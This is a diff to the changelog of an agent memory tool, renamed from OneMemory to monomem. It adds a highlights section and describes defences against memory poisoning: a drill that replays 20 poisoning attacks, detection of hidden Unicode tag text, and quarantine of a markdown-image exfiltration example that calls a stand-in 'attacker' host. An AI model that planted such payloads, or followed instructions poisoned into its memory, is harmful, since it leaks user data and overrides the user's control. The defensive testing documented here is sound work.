@@ -6,6 +6,19 @@ to follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+### Highlights
+
+- **Check your own setup.** `monomem drill` replays 20 known memory-poisoning attacks on a copy of your store.
+  `monomem health` turns that and your settings into one A to F grade and prints the rule. Two attacks are known misses.
+- **See where a note came from:** `monomem why`, `monomem receipts` and `monomem search --as-of`.
+- **Catch writers who disagree:** `monomem facts`, `monomem conflicts` and `monomem facts --check`.
+- **More control:** `approve-first --all`, `pin`, `rollback --writer`, the flood guard, the read access log, a
+  hash-chained audit log and `monomem token add`.
+- **Claude Code plugin.**
+- **Upgrade note:** the database moves to schema v18 on first start, after a verified backup. Older versions cannot
+  open it. See [docs/upgrading.md](./docs/upgrading.md).
+- **Limits:** the linter matches patterns, so reworded attacks get through; an agent with a shell can run the CLI itself.
+
 ### Added
 
 - **`monomem approve-first --all on|off`** (admin `PUT /approve-first {all, on}`): every agent write in every
@@ -46,7 +59,7 @@ to follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 - **`monomem drill`.** Replays 20 known memory-poisoning attacks on a temporary copy of your store, with your own
   settings, and shows for each one whether it was held, stored with a warning, or reached the agent. Your store is not
   changed. Two attacks are known misses and are listed as such: a reworded override the pattern linter cannot see
-  (bench E16), and self-poisoning (a trusted agent stores an attacker's instruction in its own words). Exit code 1 when
+  (scenario E16 in `monomem bench`), and self-poisoning (a trusted agent stores an attacker's instruction in its own words). Exit code 1 when
   anything else gets through; `--json` for scripts. `evals/poisoning-corpus.json` (MIT) holds the attacks and expected
   results so other memory tools can run the same set.
 - **Memory receipts.** `monomem receipts [session-id] [--json]` shows which notes each session start showed the agent
@@ -337,7 +350,7 @@ to follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   removed them before scanning, but they were stored and shown to the model as written. They are now decoded and
   scanned, and any tag character, or a run of four or more variation selectors, is flagged as "hidden Unicode tag
   text" (only the England, Scotland and Wales flag emoji are exempt). Tag characters are removed from `source` when
-  it is stored. Bench scenario E19.
+  it is stored. Covered by `monomem bench` scenario E19.
 - **Every forget, restore and expiry is now in the audit log.** Archive and restore over REST and the CLI, and the
   expiry and decay sweeps, wrote no audit line. They now do, from the store itself, whatever the caller.
 
@@ -639,7 +652,7 @@ updates; it will not be unpublished, so nothing you have installed breaks.
   measuring the developer's laptop rather than the code, the same failure that shipped the wrong Node
   floor three times in 2.1.x.
 
-## [2.1.2] - 2026-11-01
+## [OneMemory 2.1.2] - 2026-11-01
 
 **2.1.1 published the wrong Node floor and would crash for part of the line it claimed to support.**
 
@@ -716,7 +729,7 @@ Each of these was published and wrong:
 - Owner identity removed from tracked source: a real name in a test path, a personal username across
   nine lines, and a comment that compiled into the published tarball.
 
-## [2.1.1] - 2026-11-01
+## [OneMemory 2.1.1] - 2026-11-01
 
 `v2.1.0` was tagged but never published: its release run failed on Windows when a test deleted its own
 temp directory while a detached child still held the database open — after every assertion had passed.
@@ -790,11 +803,11 @@ command queueing and runner status — when the command runner is not even shipp
   the loop open; nothing else did. The bounded timeout is now held, so a wait always settles, and shutdown still ends
   waiters at once through `abortAllWaiters()`.
 
-## [2.0.1] - 2026-10-31
+## [OneMemory 2.0.1] - 2026-10-31
 
 Release-only: published to the staging registry only, never to the public npm registry. Same code as 2.0.0; releases are now staged on npm and approved by the owner.
 
-## [2.0.0] - 2026-10-31
+## [OneMemory 2.0.0] - 2026-10-31
 
 OneMemory now remembers on its own: it records what your agent does, distills it into short typed notes, and brings the
 right ones back at the start of the next session — with no model call unless you turn one on, nothing leaving your
@@ -895,7 +908,7 @@ run `onememory setup --capture` and say yes.
 - **Markdown image exfiltration is held** (`GAP-POISON-MDLINK`): a note with a remote markdown image carrying a query
   string (`![x](https://attacker/p?data=...)`), which loads by itself when rendered, goes to quarantine. Badge hosts are exempt.
 
-## [1.7.2] - 2026-10-25
+## [OneMemory 1.7.2] - 2026-10-25
 
 Windows fixes only. **No schema change** (still v15).
 
@@ -906,7 +919,7 @@ Windows fixes only. **No schema change** (still v15).
   Links and `..` that leave the repository are still refused (tests added).
 - The macOS path test in `setup.test` now accepts Windows separators.
 
-## [1.7.1] - 2026-10-25
+## [OneMemory 1.7.1] - 2026-10-25
 
 Fixes from an independent review of 1.7.0. **No schema change** (still v15).
 
@@ -938,7 +951,7 @@ Fixes from an independent review of 1.7.0. **No schema change** (still v15).
 - Setup's backups and `setup-history.json` can hold the same secrets as your config: `0600` on macOS/Linux, and on Windows they use your profile's
   normal permissions (docs/live-claude-code.md, section 6).
 
-## [1.7.0] - 2026-10-25
+## [OneMemory 1.7.0] - 2026-10-25
 
 Easy, safe connection to Claude Code and an easy way in for what Claude Code already knows. **No schema change** (still v15).
 
@@ -970,7 +983,7 @@ Easy, safe connection to Claude Code and an easy way in for what Claude Code alr
 ### Changed
 - `doctor` recognises hooks written by `setup` (which call `node <cli.js> recall`) as well as `onememory recall`.
 
-## [1.6.0] - 2026-10-25
+## [OneMemory 1.6.0] - 2026-10-25
 
 Closes every gap the 1.5.0 benchmark recorded, without ever changing a memory silently. **Schema v15** (a verified
 `<db>.pre-v15-backup` is made first; no downgrade path). Everything else is additive.
@@ -1014,7 +1027,7 @@ Closes every gap the 1.5.0 benchmark recorded, without ever changing a memory si
 - OneMemory does not guess that a new note replaces an old one. Writing a second note and leaving the first still returns both (as before); replace
   explicitly if you want the old one out of sight.
 
-## [1.5.0] - 2026-10-25
+## [OneMemory 1.5.0] - 2026-10-25
 
 A benchmark for the question "can one agent silently turn a weak guess into shared truth?". Additive only: no
 schema change, no change to any existing result shape or default.
@@ -1039,7 +1052,7 @@ schema change, no change to any existing result shape or default.
   marker and are listed in the README: `GAP-SUPERSEDE`, `GAP-RECENCY`, `GAP-HISTORY`, `GAP-CONFIDENCE` (a fifth, `GAP-REST-CAS`, was found and fixed in this release).
   They do not fail the run; a marked scenario that starts to pass does.
 
-## [1.4.2] - 2026-10-24
+## [OneMemory 1.4.2] - 2026-10-24
 
 A third expert review of 1.4.1 (coding, security, architecture, developer experience, infrastructure) found
 the holes below; every confirmed one is fixed. **Upgrading from 1.3.x: read
@@ -1134,7 +1147,7 @@ change in a minor release.
   `clear-taint` command, hiding admin-only tools from a non-admin `tools/list`, and reserving the runner
   namespace were reviewed and left for a later version.
 
-## [1.4.1] - 2026-10-24
+## [OneMemory 1.4.1] - 2026-10-24
 
 A second expert review of 1.4.0 (coding, security, architecture, developer experience, infrastructure) found
 real holes in the trust feature. All are fixed here; schema is **unchanged at v14** (an idempotent
@@ -1229,7 +1242,7 @@ The distrust list is still a policy on labels; a file that omits every writer fi
 an old signed export is possible (`not_after` retires a key, not a note); the heartbeat check trusts the
 `runner` label, which anyone holding that token can use. Windows and macOS were not exercised in this review.
 
-## [1.4.0] - 2026-10-24
+## [OneMemory 1.4.0] - 2026-10-24
 
 Trust. A server can now say whom not to believe, name writers across servers, and vouch for
 the writers it exports; the runner liveness signal is per machine. **Schema v14** (was v13): read
@@ -1285,7 +1298,7 @@ Attestations prove who signed what, not that content is true; they have no revoc
 The distrust list is a policy on labels, not a boundary against the operator. Cost of `not_written_by` and
 `note_*` filters grows with the feed window (measured 110 to 580 ms on 300,000 events).
 
-## [1.3.4] - 2026-10-24
+## [OneMemory 1.3.4] - 2026-10-24
 
 "Runner offline, N commands waiting." An approved command task used to wait
 silently when the PC was off or asleep. Now the store says so. No schema version
@@ -1343,7 +1356,7 @@ change from 1.3.3 (still v13). Also tightens 1.3.3's "who wrote this" after revi
 `distrust_writers` policy, signed writer attestations, stable cross-server writer ids,
 per-target runner heartbeats. See docs/provenance.md.
 
-## [1.3.3] - 2026-10-24
+## [OneMemory 1.3.3] - 2026-10-24
 
 "Who wrote this?" A note now records which connection wrote it, stamped by the
 server so a client cannot forge it. **Schema is now v13** (additive columns; see
@@ -1380,7 +1393,7 @@ before upgrading.
 ### Not included
 - A `distrust_writers` trust policy or per-note trust flag (idea only; see docs/provenance.md).
 
-## [1.3.2] - 2026-10-24
+## [OneMemory 1.3.2] - 2026-10-24
 
 Test-only fix for Windows CI. No runner/allowlist change, no schema change (still v12).
 
@@ -1390,7 +1403,7 @@ Test-only fix for Windows CI. No runner/allowlist change, no schema change (stil
 ### Tests
 - Added a regression test for the Windows-style path against the pattern (and injection strings still rejected); the main command-task test now prints the runner's result if the marker is missing.
 
-## [1.3.1] - 2026-10-24
+## [OneMemory 1.3.1] - 2026-10-24
 
 Fix release: package name, CI, and Windows. No schema change (still v12).
 
@@ -1405,7 +1418,7 @@ Fix release: package name, CI, and Windows. No schema change (still v12).
 - The SIGTERM graceful-drain test is skipped on Windows only, which has no SIGTERM (a kill there is a hard terminate). It still runs on Linux and macOS.
 - Windows was not run locally; these fixes are reasoned from the CI log, not executed on Windows.
 
-## [1.3.0] - 2026-10-24
+## [OneMemory 1.3.0] - 2026-10-24
 
 Cross-device / cross-model awareness: every session can see what the others
 did and plan, and a task can now drive the PC's runner. Tasks, handoffs, leases
@@ -1547,7 +1560,7 @@ with the exceptions listed under "Changed".
   chat window (chat clients still act only on a user turn); the systemd and Task
   Scheduler recipes were written but not run.
 
-## [1.2.1] - 2026-10-24
+## [OneMemory 1.2.1] - 2026-10-24
 
 **Package name:** the npm package is `onememory-mcp` (the command is `onememory`). An earlier version of this note claimed a rename to a scoped name; that was wrong. Neither the plain `onememory` name nor a scoped name was ever published.
 
@@ -1643,7 +1656,7 @@ release). Docs were corrected to match what actually ships.
   publish unless the tag equals the `package.json` version, and documents the
   exact npm Trusted Publisher settings it depends on.
 
-## [1.2.0] - 2026-10-22
+## [OneMemory 1.2.0] - 2026-10-22
 
 ### Encryption at rest, retention, per-token namespaces
 
@@ -1738,7 +1751,7 @@ Prompted by community feedback about stores with months of accumulated edits.
   publish workflow installs on purpose); it now accepts both shapes, verified
   against npm 11.16.0 and 12.2.1.
 
-## [1.1.0] - 2026-10-16
+## [OneMemory 1.1.0] - 2026-10-16
 
 ### Upgrade notes
 
@@ -1979,7 +1992,7 @@ Prompted by community feedback about stores with months of accumulated edits.
   `precomputeTfMaps()` helper — the tokenizer no longer runs inside any
   pair loop.
 
-## [1.0.0] — 2026-10-15
+## [OneMemory 1.0.0] — 2026-10-15
 
 First public version.
 
